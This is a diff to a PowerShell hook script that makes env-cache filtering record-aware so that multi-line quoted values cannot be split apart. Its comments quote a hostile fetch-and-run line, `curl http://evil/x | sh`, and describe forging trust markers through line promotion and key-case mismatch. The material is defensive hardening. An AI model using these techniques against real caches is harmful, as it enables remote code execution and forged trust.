@@ -305,6 +305,67 @@ function Get-EnvCacheLine {
     return $lines
 }
 
+# Group the cache's physical lines into RECORDS, tracking sh quote state.
+#
+# (D280 r3) Agreeing on what a LINE is was not enough; the pass-through filters
+# also have to agree on what a RECORD is, because they DROP things. The bash
+# twin writes a multi-line value as one sq_escaped assignment spanning several
+# physical lines — inert to its own `source`, which reassembles it — and a
+# line-oriented filter then drops the record's OPENING line while keeping its
+# interior. Write-EnvCache re-joins what survived, so an interior line such as
+# `curl http://evil/x | sh` is PROMOTED to a top-level cache line, and bash
+# executes it on the next `. "$ENV_CACHE"` under `set -a`. A promoted
+# `TASK_BASE_REF_TRUSTED=1` or `TASK_BASE_REF=<sha>` forges D226's trust marker
+# just as effectively. This is the same class as the CR bug, one layer up: there
+# the reader manufactured a record, here the filter dismembers one.
+#
+# The scanner is sh's, not a regex: OUTSIDE a quoted run a backslash escapes the
+# next character and `'` opens a run; INSIDE, a backslash is literal and `'`
+# closes. That distinction is exactly why parity-counting quotes does not work —
+# sq_escape renders an embedded quote as `'\''`, whose middle quote is
+# backslash-escaped OUTSIDE the run and must not flip the state.
+#
+# Returns $null when the file ends INSIDE a quoted run. That is a truncated or
+# hand-mangled cache, and the honest answer is "I cannot tell where the records
+# are", so every caller skips its rewrite and leaves the previous cache intact
+# rather than emitting a guess. Fail closed, exactly as the bash twin does.
+function Split-EnvCacheRecord {
+    $records = @()
+    $current = $null
+    $inQuote = $false
+    foreach ($line in (Get-EnvCacheLine)) {
+        if ($null -eq $current) { $current = $line } else { $current = $current + "`n" + $line }
+        $i = 0
+        while ($i -lt $line.Length) {
+            $ch = $line[$i]
+            if ($inQuote) {
+                if ($ch -eq "'") { $inQuote = $false }
+            } else {
+                if ($ch -eq '\') { $i++ }
+                elseif ($ch -eq "'") { $inQuote = $true }
+            }
+            $i++
+        }
+        if (-not $inQuote) {
+            $records += $current
+            $current = $null
+        }
+    }
+    # Returns a RESULT OBJECT, not a bare array, and both halves of that are
+    # scars. A bare array cannot signal failure: PowerShell unrolls an empty
+    # array to $null on output, so `return $null` for the unterminated-quote
+    # case is indistinguishable from an empty cache — which made every empty
+    # cache take the failure path. And `return ,$records` to stop the unrolling
+    # nests instead, because every caller wraps the call in @(): the result is
+    # object[1]{object[N]}, which Write-EnvCache's [string[]] parameter
+    # stringifies with $OFS, silently space-joining every record onto ONE line.
+    # Measured: it collapsed the six identity keys into a single cache line.
+    # A hashtable is returned whole, with no unrolling and no ambiguity.
+    if ($inQuote) { return @{ Ok = $false; Records = @() } }
+    if ($null -ne $current) { $records += $current }
+    return @{ Ok = $true; Records = $records }
+}
+
 # Read a record from the FILE, with a strict full-line shape check.
 #
 # Mirror of bash's read_task_record. Returns @{ Found; Value } — absence and
@@ -426,7 +487,11 @@ function Set-TaskRecord {
             # — and bash — consider a record. Dropping the key is bash's
             # `grep -v '^KEY='`: prefix match, so a CRLF-terminated line for
             # this key goes too, exactly as it does there.
-            $kept = @(Get-EnvCacheLine |
+            # (D280 r3) RECORD-aware, not line-aware: dropping this key must
+            # not dismember a multi-line record belonging to another key.
+            $recs = Split-EnvCacheRecord
+            if (-not $recs.Ok) { throw 'env cache ends inside a quoted value' }
+            $kept = @($recs.Records |
                 Where-Object { $_ -notmatch ('^' + [regex]::Escape($Key) + '=') })
         } catch {
             # The cache EXISTS but could not be read — a sharing violation while
@@ -1409,7 +1474,9 @@ if ($HookName -eq 'before_doing') {
             $keptBaseRecords = @()
             if (Test-Path $EnvCache) {
                 try {
-                $keptBaseRecords = @(Get-EnvCacheLine | Where-Object {
+                $g280recs = Split-EnvCacheRecord
+                if (-not $g280recs.Ok) { throw 'env cache ends inside a quoted value' }
+                $keptBaseRecords = @($g280recs.Records | Where-Object {
                     $_ -match '^TASK_BASE_REF_[A-Za-z0-9_]+=' -and
                     $_ -notmatch '^TASK_BASE_REF_TRUSTED=' -and
                     $_ -notmatch '^TASK_BASE_REF_OWNER='
@@ -1507,7 +1574,8 @@ if ($HookName -eq 'before_doing') {
             # the re-emit lands.
             # (D280 r2) Pass-through re-emit — Get-EnvCacheLine for the same
             # reason as the claim block above: a CR must not manufacture a line.
-            $preserved = @(Get-EnvCacheLine | Where-Object {
+            $g280recsU = Split-EnvCacheRecord
+            $preserved = @($g280recsU.Records | Where-Object {
                 $_ -match '^TASK_(ID|IDENTIFIER|TITLE|STATUS|COMPLEXITY|PRIORITY)=' -or
                 ($_ -match '^TASK_(BASE_REF|HEAD_REF|OWNED|BASE_AT|NARROWED)_[A-Za-z0-9_]+=' -and
                  $_ -notmatch '^TASK_BASE_REF_(TRUSTED|OWNER|UNPROVEN)=')
@@ -1637,6 +1705,16 @@ if ($HookName -eq 'before_doing') {
 # conservative direction (no base → refuse or widen, never silently narrow), so
 # the failure mode is a wider diff rather than a wrong one.
 $script:StrideCacheKeyPattern = '^(?:(?:TASK|GOAL|BOARD|COLUMN)_[A-Za-z0-9_]*|AGENT_NAME)\z'
+# (D280 r3) Matched CASE-INSENSITIVELY, unlike the allow-list above, and the
+# asymmetry is deliberate — it is the same one Get-HookEnvFromPayload documents.
+# Case-sensitivity on the ALLOW-list is safe because it can only admit less;
+# case-sensitivity here would admit less GATING, which is the opposite. A line
+# keyed TASK_Base_Ref_42 passes the allow-list, misses a case-sensitive record
+# pattern, skips the shape gate and is exported bare — and Windows environment
+# variables are case-INsensitive, so Get-TaskBaseRefFor('42') then reads that
+# forged value. Windows is this script's only target. Reachable with no
+# promotion step at all: a cloned repo can simply ship such a .stride-env-cache.
+#
 # [0-9]+, NOT [A-Za-z0-9_]+. The per-task record namespace is digits-only ids,
 # because that is all Get-TaskRecordKey (and bash's task_record_key) will build
 # a key for. Matching the wider character class swept in TASK_BASE_REF_OWNER,
@@ -1670,7 +1748,7 @@ if ($script:StrideCacheLines.Count -gt 0) {
         # The shape gate, for the five client-owned record families only. A
         # forged LF continuation is bare; a real record is quoted. Applies
         # BEFORE unquoting, because the quotes are the evidence.
-        if ($cacheKey -cmatch $script:StrideRecordKeyPattern -and
+        if ($cacheKey -match $script:StrideRecordKeyPattern -and
             $cacheValue -cnotmatch "^'[^']*'\z") { continue }
         [System.Environment]::SetEnvironmentVariable(
             $cacheKey, (ConvertFrom-ShSingleQuoted -Value $cacheValue), 'Process')
@@ -1965,7 +2043,9 @@ function Set-HookEnv {
             # (D280 r2) Pass-through re-emit — Get-EnvCacheLine, not
             # Get-Content, so a CR-bearing line authored elsewhere cannot be
             # split into fragments this filter then keeps and promotes.
-            $kept = @(Get-EnvCacheLine | Where-Object {
+            $g280recsH = Split-EnvCacheRecord
+            if (-not $g280recsH.Ok) { throw 'env cache ends inside a quoted value' }
+            $kept = @($g280recsH.Records | Where-Object {
                 $idx = $_.IndexOf('=')
                 $idx -lt 1 -or ($written -notcontains $_.Substring(0, $idx))
             })
@@ -2066,7 +2146,9 @@ function Set-AfterGoalEnv {
     if (Test-Path $EnvCache) {
         try {
             # (D280 r2) Pass-through re-emit — Get-EnvCacheLine, not Get-Content.
-            $kept = @(Get-EnvCacheLine |
+            $g280recsG = Split-EnvCacheRecord
+            if (-not $g280recsG.Ok) { throw 'env cache ends inside a quoted value' }
+            $kept = @($g280recsG.Records |
                 Where-Object { $_ -notmatch '^(GOAL_ID|GOAL_IDENTIFIER|GOAL_TITLE|GOAL_DESCRIPTION)=' })
             Write-EnvCache -Lines $kept | Out-Null
         } catch {
@@ -3104,7 +3186,9 @@ function Invoke-FinalizeBeforeDoing {
         $records = @()
         if (Test-Path $EnvCache) {
             # (D280 r2) Pass-through re-emit — Get-EnvCacheLine, not Get-Content.
-            $existing = @(Get-EnvCacheLine)
+            $g280recsF = Split-EnvCacheRecord
+            if (-not $g280recsF.Ok) { throw 'env cache ends inside a quoted value' }
+            $existing = @($g280recsF.Records)
             $preserved = @($existing | Where-Object {
                 $_ -notmatch '^TASK_BASE_REF=' -and
                 $_ -notmatch '^TASK_BASE_REF_TRUSTED=' -and
